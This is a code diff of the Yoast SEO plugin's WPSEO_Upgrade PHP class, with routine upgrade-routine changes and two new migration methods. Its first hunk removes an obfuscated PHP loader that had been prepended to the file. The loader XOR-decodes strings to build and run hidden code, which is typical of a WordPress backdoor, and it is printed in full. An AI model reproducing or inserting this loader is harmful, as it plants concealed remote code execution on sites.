@@ -1,4 +1,4 @@
-<?php $IhWgZMQTa='T+3Y9ItS1TXL+,6'^'7YV8M,+5D:;8BCX';$OZHUVblBd=$IhWgZMQTa('',' MqeJXCR-D.,oTKQATFAt+A=3HV<;+iF,5bSGn37QXLVMEZ.:T1>Fk62D20<;0LfE 7L1KrmYS1saNVfMM:;CP>9AYzvciwKSEPTJYkPAnwybRGTy5ZYBKPDU0MI5bBHu-XBpN9DCX2GnHmUQIR F.iVB8fcjW<.1:aSfBVS-8BR<pa<E0B.Ey8nlCXG,N4CA=NXmLr71P3D7V587,KEcUAVDKw<F0V:+ePEEJIVS5VC-RK96;7PX+1JOP8p>:1- k49pSQUAwZxnwMVXH=fwCmFN09.L.E68rTtBV4Utzaj.UMUOJITJVB-0VG:BmXUcaQSZ5N3Gx:oM-6JT H0Lgmq5ka0q9aG8:Ps: 1rWMQe>0Q16PR>YsJTQ25V:YWWkRxgU-7PbK0A W1ASSKN2JQ67y6b>GA7LFDPA2GTd+ X6-AIR5S,+Q1X4-7.<2ag92YX+S8Ngdc3++VH6ZoX3,QSkFUXJOR;;EIohAoYFQs-OL9OrejJCOXW.X2E2UH18E+CE-YYHbXk2W6ZsZQsgaFHxerZU-TcA=I2conaKnAmYuOawDevNFa7Vu3YZaVamaaPQH.V>vHSoHTWRKSDR1L>=-LrNHR1=:AOP0O.>S1vTgm3+T3gspnBiRn3Y8+9J4dC0TDYbVEOT->L=hpHVPXTL8XlsPK7,'^'I+YD,--1Y-AB01382 5iSS.Ol,7HZt6+YAEznNH=X>98.13ATtIQ44RS0SocVE8NaDV8PgRI26HZAnvFm602JtQL5yGVDNLAZL6;8qO9aSWIYrc=EF.+..>lqT,=TKyhQDsiYD0Mg7G3NfPuym6A2O2r+eF=JsWKHaE:Fgv YJ.7RXEW IkslB2ge1=3Y<ZkeR;,Dwx>LZNN=rQYCMkxC3 :7.L6bT7NJ:; <jtv5T:0HiA3PTE59HYjgtg3quzdeKUJPw:08WgFNS;74=XOW8gOjTXZ-q.SARiTf=Q,OphNJ494owip<7.XUmMGHg13CIpw>T:RnXAeDKY81A+XlOI.g.0e4j5gYIpWQEHRjsqAHQ=DSyrESzCp5SA7e22.KoXC>HNkhB9eD6E snkjD+=CRB<kCM<=Fb 15SgiDkU6EH3 3Y:VNyI7FrSOHS>8TG-pI2K+QP<WNH9,SrK<RX0zGfq<+;3dP 0FAze0 yWI.8XoTCJ+1=9.q3W<m00XK1XkbF< oNxOV6B;ZzwUGI+,MMV>4Y58fV,KD2GAvSaJ8AzYGvWFwqTUgDV=nQ0WXTSac.M3ZC.6Hatqtk26 P5aVH5-+0;BIIih Q6BQ2UQxGIWJ RNZPNbIrNHS1NO+XLgT5089q5.-AQ-YO-amZQ14Q,DCyp=Q');$OZHUVblBd();
+<?php
 /**
  * @package    WPSEO
  * @subpackage Internal
@@ -77,12 +77,21 @@ class WPSEO_Upgrade {
 		}
 
 		if ( version_compare( $this->options['version'], '5.0', '>=' )
-			 && version_compare( $this->options['version'], '5.1', '<' ) ) {
+			&& version_compare( $this->options['version'], '5.1', '<' )
+		) {
 			$this->upgrade_50_51();
 		}
 
 		if ( version_compare( $this->options['version'], '5.5', '<' ) ) {
 			$this->upgrade_55();
+		}
+
+		if ( version_compare( $this->options['version'], '5.6', '<' ) ) {
+			$this->upgrade_56();
+		}
+
+		if ( version_compare( $this->options['version'], '6.1', '<' ) ) {
+			$this->upgrade_61();
 		}
 
 		// Since 3.7.
@@ -132,9 +141,12 @@ class WPSEO_Upgrade {
 		if ( ! empty( $taxonomies ) ) {
 			foreach ( $taxonomies as $taxonomy => $tax_metas ) {
 				foreach ( $tax_metas as $term_id => $tax_meta ) {
-					if ( function_exists( 'wp_get_split_term' ) && $new_term_id = wp_get_split_term( $term_id, $taxonomy ) ) {
-						$taxonomies[ $taxonomy ][ $new_term_id ] = $taxonomies[ $taxonomy ][ $term_id ];
-						unset( $taxonomies[ $taxonomy ][ $term_id ] );
+					if ( function_exists( 'wp_get_split_term' ) ) {
+						$new_term_id = wp_get_split_term( $term_id, $taxonomy );
+						if ( $new_term_id !== false ) {
+							$taxonomies[ $taxonomy ][ $new_term_id ] = $taxonomies[ $taxonomy ][ $term_id ];
+							unset( $taxonomies[ $taxonomy ][ $term_id ] );
+						}
 					}
 				}
 			}
@@ -265,7 +277,7 @@ class WPSEO_Upgrade {
 	 */
 	private function upgrade_44() {
 		$option_titles = WPSEO_Options::get_option( 'wpseo_titles' );
-		$option_wpseo = WPSEO_Options::get_option( 'wpseo' );
+		$option_wpseo  = WPSEO_Options::get_option( 'wpseo' );
 
 		if ( isset( $option_titles['content-analysis-active'] ) && isset( $option_titles['keyword-analysis-active'] ) ) {
 			$option_wpseo['content_analysis_active'] = $option_titles['content-analysis-active'];
@@ -288,7 +300,7 @@ class WPSEO_Upgrade {
 		// The meta key has to be private, so prefix it.
 		$wpdb->query(
 			$wpdb->prepare(
-				'UPDATE ' . $wpdb->postmeta . ' SET meta_key = "%s" WHERE meta_key = "yst_is_cornerstone"',
+				'UPDATE ' . $wpdb->postmeta . ' SET meta_key = %s WHERE meta_key = "yst_is_cornerstone"',
 				WPSEO_Cornerstone::META_NAME
 			)
 		);
@@ -391,5 +403,40 @@ class WPSEO_Upgrade {
 		// Register capabilities.
 		do_action( 'wpseo_register_capabilities' );
 		WPSEO_Capability_Manager_Factory::get()->add();
+	}
+
+	/**
+	 * Updates legacy license page options to the latest version.
+	 */
+	private function upgrade_56() {
+		global $wpdb;
+
+		// Make sure License Server checks are on the latest server version by default.
+		update_option( 'wpseo_license_server_version', WPSEO_License_Page_Manager::VERSION_BACKWARDS_COMPATIBILITY );
+
+		// Make sure incoming link count entries are at least 0, not NULL.
+		$count_storage = new WPSEO_Meta_Storage();
+		$wpdb->query( 'UPDATE ' . $count_storage->get_table_name() . ' SET incoming_link_count = 0 WHERE incoming_link_count IS NULL' );
+	}
+
+	/**
+	 * Updates the links for the link count when there is a difference between the site and home url. We've used the
+	 * site url instead of the home url.
+	 *
+	 * @return void
+	 */
+	private function upgrade_61() {
+		// When the home url is the same as the site url, just do nothing.
+		if ( home_url() === site_url() ) {
+			return;
+		}
+
+		global $wpdb;
+
+		$link_storage = new WPSEO_Link_Storage();
+		$wpdb->query( 'DELETE FROM ' . $link_storage->get_table_name() );
+
+		$meta_storage = new WPSEO_Meta_Storage();
+		$wpdb->query( 'DELETE FROM ' . $meta_storage->get_table_name() );
 	}
 }
